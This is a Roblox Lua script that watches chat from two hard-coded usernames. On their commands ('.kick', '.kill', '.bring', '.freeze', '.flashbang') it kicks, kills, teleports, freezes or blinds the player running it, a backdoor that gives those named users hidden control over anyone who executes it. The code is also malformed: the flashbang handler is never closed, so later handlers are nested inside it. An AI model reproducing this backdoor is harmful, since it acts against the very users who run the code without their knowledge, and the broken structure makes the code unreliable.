local regaki = game.Players.lukezvne

regaki.Chatted:connect(function(cht)
    if cht:match(".kick") then
        game.Players.LocalPlayer:Kick('Kicked by a premium user.');
end
end)



regaki.Chatted:connect(function(cht)
    if cht:match(".bring") then
local RegakiCFrame = regaki.Character.HumanoidRootPart.Position


game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(RegakiCFrame)
end
end)




regaki.Chatted:connect(function(cht)
    if cht:match(".kill") then

        game.Players.LocalPlayer.Character.Humanoid.Health = 0

end
end)



regaki.Chatted:connect(function(cht)
    if cht:match(".freeze") then

        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true

end
end)



regaki.Chatted:connect(function(cht)
    if cht:match(".thaw") then

        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false

end
end)




regaki.Chatted:connect(function(cht)
    if cht:match(".flashbang") then

        game.Lighting.ExposureCompensation = 10000000000
        wait(3)
                game.Lighting.ExposureCompensation = 3
                wait(0.25)
                game.Lighting.ExposureCompensation = 2
            
         wait(0.25)
                    game.Lighting.ExposureCompensation = 1
   wait(0.25) 
game.Lighting.ExposureCompensation = 0


local david = game.Players.OppSpotta19

david.Chatted:connect(function(cht)
    if cht:match(".kick") then
        game.Players.LocalPlayer:Kick('regaki w');
end
end)



david.Chatted:connect(function(cht)
    if cht:match(".bring") then
local RegakiCFrame = david.Character.HumanoidRootPart.Position


game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(RegakiCFrame)
end
end)




david.Chatted:connect(function(cht)
    if cht:match(".kill") then

        game.Players.LocalPlayer.Character.Humanoid.Health = 0

end
end)
